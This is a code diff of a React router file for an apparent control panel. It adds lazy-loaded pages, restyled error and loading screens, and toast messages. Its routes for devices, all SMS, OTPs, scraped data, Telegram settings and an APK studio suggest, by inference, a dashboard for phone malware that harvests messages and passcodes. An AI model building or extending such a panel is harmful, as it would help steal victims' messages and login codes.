@@ -1,36 +1,48 @@
 import { Route, Switch, Router as WouterRouter, useLocation } from "wouter";
 import { useAuth } from "@/lib/auth";
-import { Component, useEffect, type ReactNode } from "react";
+import { Component, Suspense, lazy, useEffect, type ReactNode } from "react";
 
 // Pages
 import { Login } from "@/pages/login";
 import { Dashboard } from "@/pages/dashboard";
-import { DeviceDetail } from "@/pages/device-detail";
 import { Subscriptions } from "@/pages/subscriptions";
-import { Profile } from "@/pages/profile";
-import { AllSms } from "@/pages/all-sms";
-import { ScrapedData } from "@/pages/scraped";
-import { TelegramSettings } from "@/pages/telegram-settings";
-import { UserSearch } from "@/pages/user-search";
-import { OtpPanel } from "@/pages/otps";
 import { Firebases } from "@/pages/firebases";
+import { UserSearch } from "@/pages/user-search";
 import { ApkStudio } from "@/pages/apk-studio";
 import { Tool } from "@/pages/tool";
 import { Pam } from "@/pages/pam";
 import NotFound from "@/pages/not-found";
 
+// Lazy pages (firebase SDK consumers) — code-split so the main bundle stays light
+const DeviceDetail = lazy(() =>
+  import("@/pages/device-detail").then((m) => ({ default: m.DeviceDetail }))
+);
+const AllSms = lazy(() =>
+  import("@/pages/all-sms").then((m) => ({ default: m.AllSms }))
+);
+const ScrapedData = lazy(() =>
+  import("@/pages/scraped").then((m) => ({ default: m.ScrapedData }))
+);
+const TelegramSettings = lazy(() =>
+  import("@/pages/telegram-settings").then((m) => ({
+    default: m.TelegramSettings,
+  }))
+);
+const OtpPanel = lazy(() =>
+  import("@/pages/otps").then((m) => ({ default: m.OtpPanel }))
+);
+const Profile = lazy(() =>
+  import("@/pages/profile").then((m) => ({ default: m.Profile }))
+);
+
 // Providers
-import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
 import { Toaster } from "@/components/ui/toaster";
 import { TooltipProvider } from "@/components/ui/tooltip";
 import { AuthProvider } from "@/lib/auth";
 import { ThemeProvider } from "next-themes";
-
-const queryClient = new QueryClient({
-  defaultOptions: {
-    queries: { retry: 1, staleTime: 30_000, refetchOnWindowFocus: false },
-  },
-});
+import { SearchProvider } from "@/lib/search";
+import { authHeaders } from "@/lib/apiFetch";
+import { toast } from "@/hooks/use-toast";
 
 // Error Boundary — shows the actual error instead of a white screen
 class ErrorBoundary extends Component<
@@ -47,20 +59,16 @@ class ErrorBoundary extends Component<
     if (this.state.error) {
       const e = this.state.error;
       return (
-        <div
-          style={{
-            padding: 24,
-            fontFamily: "monospace",
-            whiteSpace: "pre-wrap",
-          }}
-        >
-          <h2>⚠️ Something went wrong</h2>
+        <div className="min-h-screen bg-background text-foreground flex items-center justify-center p-6">
+          <div className="w-full max-w-xl rounded-2xl border border-card-border bg-card p-6 shadow-sm">
+            <p className="page-eyebrow">Panel error</p>
+            <h2 className="font-display text-xl font-bold tracking-tight">Something went wrong</h2>
           <p>
             <strong>Error name:</strong> {e.name || "unknown"}
           </p>
           <p>
             <strong>Error message:</strong>{" "}
-            <span style={{ color: "red" }}>
+            <span className="text-destructive">
               {e.message || "(empty message)"}
             </span>
           </p>
@@ -68,19 +76,12 @@ class ErrorBoundary extends Component<
           <p style={{ fontSize: 12 }}>
             <strong>Stack trace:</strong>
           </p>
-          <pre
-            style={{
-              fontSize: 12,
-              background: "#f5f5f5",
-              padding: 12,
-              borderRadius: 8,
-              overflow: "auto",
-            }}
-          >
+          <pre className="mt-2 max-h-64 overflow-auto rounded-xl border border-card-border bg-muted p-3 font-mono text-xs leading-relaxed">
             {import.meta.env.DEV
               ? e.stack || String(e)
               : "Stack hidden in production. Check logs."}
           </pre>
+          </div>
         </div>
       );
     }
@@ -99,8 +100,15 @@ function ProtectedRoute({ component: Component, ...rest }: any) {
 
   if (isAuthenticated === null) {
     return (
-      <div className="min-h-screen bg-background flex items-center justify-center font-mono text-muted-foreground">
-        Loading...
+      <div
+        className="min-h-screen bg-background flex items-center justify-center text-muted-foreground"
+        role="status"
+        aria-live="polite"
+      >
+        <span className="inline-flex items-center gap-2 font-mono text-sm">
+          <span className="inline-block h-4 w-4 animate-spin rounded-full border-2 border-muted-foreground/30 border-t-foreground" />
+          Loading…
+        </span>
       </div>
     );
   }
@@ -120,8 +128,15 @@ function AdminRoute({ component: Component, ...rest }: any) {
 
   if (isAuthenticated === null) {
     return (
-      <div className="min-h-screen bg-background flex items-center justify-center font-mono text-muted-foreground">
-        Loading...
+      <div
+        className="min-h-screen bg-background flex items-center justify-center text-muted-foreground"
+        role="status"
+        aria-live="polite"
+      >
+        <span className="inline-flex items-center gap-2 font-mono text-sm">
+          <span className="inline-block h-4 w-4 animate-spin rounded-full border-2 border-muted-foreground/30 border-t-foreground" />
+          Loading…
+        </span>
       </div>
     );
   }
@@ -131,49 +146,60 @@ function AdminRoute({ component: Component, ...rest }: any) {
 
 function Router() {
   return (
-    <Switch>
-      <Route path="/" component={Login} />
-      <Route path="/dashboard">
-        {() => <ProtectedRoute component={Dashboard} />}
-      </Route>
-      <Route path="/device/:id">
-        {() => <ProtectedRoute component={DeviceDetail} />}
-      </Route>
-      <Route path="/subscriptions">
-        {() => <AdminRoute component={Subscriptions} />}
-      </Route>
-      <Route path="/profile">
-        {() => <ProtectedRoute component={Profile} />}
-      </Route>
-      <Route path="/all-sms">
-        {() => <ProtectedRoute component={AllSms} />}
-      </Route>
-      <Route path="/firebases">
-        {() => <ProtectedRoute component={Firebases} />}
-      </Route>
-      <Route path="/otps">
-        {() => <ProtectedRoute component={OtpPanel} />}
-      </Route>
-      <Route path="/data">
-        {() => <ProtectedRoute component={ScrapedData} />}
-      </Route>
-      <Route path="/telegram">
-        {() => <ProtectedRoute component={TelegramSettings} />}
-      </Route>
-      <Route path="/user-search">
-        {() => <ProtectedRoute component={UserSearch} />}
-      </Route>
-      <Route path="/apk-studio">
-        {() => <ProtectedRoute component={ApkStudio} />}
-      </Route>
-      <Route path="/tool">
-        {() => <ProtectedRoute component={Tool} />}
-      </Route>
-      <Route path="/pam">
-        {() => <AdminRoute component={Pam} />}
-      </Route>
-      <Route component={NotFound} />
-    </Switch>
+    <Suspense
+      fallback={
+        <div
+          className="min-h-screen bg-background flex items-center justify-center text-muted-foreground"
+          role="status"
+          aria-live="polite"
+        >
+          <span className="inline-flex items-center gap-2 font-mono text-sm">
+            <span className="inline-block h-4 w-4 animate-spin rounded-full border-2 border-muted-foreground/30 border-t-foreground" />
+            Loading…
+          </span>
+        </div>
+      }
+    >
+      <Switch>
+        <Route path="/" component={Login} />
+        <Route path="/dashboard">
+          {() => <ProtectedRoute component={Dashboard} />}
+        </Route>
+        <Route path="/device/:id">
+          {() => <ProtectedRoute component={DeviceDetail} />}
+        </Route>
+        <Route path="/subscriptions">
+          {() => <AdminRoute component={Subscriptions} />}
+        </Route>
+        <Route path="/profile">
+          {() => <ProtectedRoute component={Profile} />}
+        </Route>
+        <Route path="/all-sms">
+          {() => <ProtectedRoute component={AllSms} />}
+        </Route>
+        <Route path="/firebases">
+          {() => <ProtectedRoute component={Firebases} />}
+        </Route>
+        <Route path="/otps">
+          {() => <ProtectedRoute component={OtpPanel} />}
+        </Route>
+        <Route path="/data">
+          {() => <ProtectedRoute component={ScrapedData} />}
+        </Route>
+        <Route path="/telegram">
+          {() => <ProtectedRoute component={TelegramSettings} />}
+        </Route>
+        <Route path="/user-search">
+          {() => <ProtectedRoute component={UserSearch} />}
+        </Route>
+        <Route path="/apk-studio">
+          {() => <ProtectedRoute component={ApkStudio} />}
+        </Route>
+        <Route path="/tool">{() => <ProtectedRoute component={Tool} />}</Route>
+        <Route path="/pam">{() => <AdminRoute component={Pam} />}</Route>
+        <Route component={NotFound} />
+      </Switch>
+    </Suspense>
   );
 }
 
@@ -212,7 +238,7 @@ function ShareLinkImporter() {
         );
         const res = await fetch(`${API_BASE}/api/firebases`, {
           method: "POST",
-          headers: { "Content-Type": "application/json" },
+          headers: { "Content-Type": "application/json", ...authHeaders() },
           body: JSON.stringify({
             name: proj?.[1] || "shared-panel",
             databaseURL: url,
@@ -228,12 +254,24 @@ function ShareLinkImporter() {
         // strip the ?s= from the URL so it doesn't re-import
         window.history.replaceState({}, "", window.location.pathname);
         if (json.success) {
-          alert("✅ Imported shared panel: " + (json.firebase?.name || url));
+          toast({
+            title: "Panel imported",
+            description:
+              "Imported shared panel: " + (json.firebase?.name || url),
+          });
         } else {
-          alert("⚠️ Import failed: " + (json.error || "unknown"));
+          toast({
+            title: "Import failed",
+            description: json.error || "unknown error",
+            variant: "destructive",
+          });
         }
       } catch (err: any) {
-        alert("⚠️ Import failed: " + (err?.message || "network error"));
+        toast({
+          title: "Import failed",
+          description: err?.message || "network error",
+          variant: "destructive",
+        });
       }
     })();
   }, [isAuthenticated, isAdmin, location]);
@@ -244,7 +282,7 @@ function ShareLinkImporter() {
 function App() {
   return (
     <ErrorBoundary>
-      <QueryClientProvider client={queryClient}>
+      <SearchProvider>
         <AuthProvider>
           <ThemeProvider attribute="class" defaultTheme="dark" enableSystem>
             <TooltipProvider>
@@ -256,7 +294,7 @@ function App() {
             </TooltipProvider>
           </ThemeProvider>
         </AuthProvider>
-      </QueryClientProvider>
+      </SearchProvider>
     </ErrorBoundary>
   );
 }
